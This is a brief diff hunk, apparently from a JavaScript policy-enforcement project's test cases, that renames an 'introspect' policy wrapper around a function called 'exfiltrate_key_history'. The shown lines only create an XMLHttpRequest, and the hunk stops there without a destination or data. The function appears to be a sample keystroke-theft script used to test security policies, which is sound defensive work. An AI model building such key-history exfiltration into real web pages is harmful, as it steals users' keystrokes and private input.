@@ -1,4 +1,4 @@
-introspect(JAMScript.introspectors.processAll) {
+introspect(JAM.policy.pFull) {
 function exfiltrate_key_history() {
   xmlhttp = new XMLHttpRequest;
   var v0 = xmlhttp;
